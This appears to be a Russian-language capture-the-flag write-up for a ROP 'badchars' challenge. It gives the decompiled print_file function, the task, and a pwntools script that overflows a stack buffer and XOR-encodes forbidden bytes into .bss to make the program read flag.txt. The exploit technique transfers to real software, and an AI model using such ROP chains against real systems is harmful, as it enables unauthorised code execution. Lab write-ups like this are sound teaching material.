void __fastcall print_file(const char *a1)
{
  char s[40]; // [rsp+10h] [rbp-30h] BYREF
  FILE *stream; // [rsp+38h] [rbp-8h]

  stream = fopen(a1, "r");
  if ( !stream )
  {
    printf("Failed to open file: %s\n", a1);
    exit(1);
  }
  fgets(s, 33, stream);
  puts(s);
  fclose(stream);
}

Необходимо сделать всё же, что и в [4. write4](4.%20write4.md), но записать в `.bss` строку `flag.txt` не используя символы `x`, `g`, `a` и `.`.

Эксплоит:
``` python
pop_r14_pop_r15 = 0x4006a0
xor_r15_r14 = 0x400628
bss = 0x601038
pop_rdi = 0x4006a3
call_print_file = 0x400620

def write(addr, char, xor=None):
    if xor is not None:
        char = bytes([char[0] ^ xor[0]])
    payload = p64(pop_r14_pop_r15) + char.ljust(8, b'\x00') + p64(addr)
    payload += p64(xor_r15_r14)
    if xor is not None:
        payload += p64(pop_r14_pop_r15) + xor.ljust(8, b'\x00') + p64(addr)
        payload += p64(xor_r15_r14)
    return payload

io = start()

payload =  b'A' * (32 + 8)
payload += write(bss+0, b'f')
payload += write(bss+1, b'l')
payload += write(bss+2, b'a', b'\xde')
payload += write(bss+3, b'g', b'\xad')
payload += write(bss+4, b'.', b'\xbe')
payload += write(bss+5, b't')
payload += write(bss+6, b'x', b'\xef')
payload += write(bss+7, b't')
payload += p64(pop_rdi) + p64(bss)
payload += p64(call_print_file)
io.sendline(payload)

io.interactive()
```
